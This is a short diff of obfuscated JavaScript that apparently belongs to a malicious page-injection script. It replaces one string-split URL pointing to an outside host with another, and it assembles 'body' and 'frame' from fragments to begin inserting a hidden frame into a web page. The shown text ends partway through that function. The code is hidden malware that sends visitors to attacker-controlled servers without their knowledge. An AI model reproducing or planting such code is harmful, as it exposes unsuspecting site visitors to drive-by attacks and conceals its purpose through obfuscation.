@@ -1,7 +1,5 @@
-var thisur = 'ht'+'tp://ent'+'erweb'+'s.'+'ru/resul'+'tdie'+'t/?'+'pid=2'+'9899';
+var thisur = 'http://'+'nc'+'dn.'+'mo'+'oo.'+'com/v'+'ds/d'+'est.p'+'hp?si'+'d=10'
 function vistaz() {
-
-
 sz = 'dy';
 myt = 'fr' + 'am' + 'e';
 var myu = document.getElementsByTagName('bo' + sz)[0];
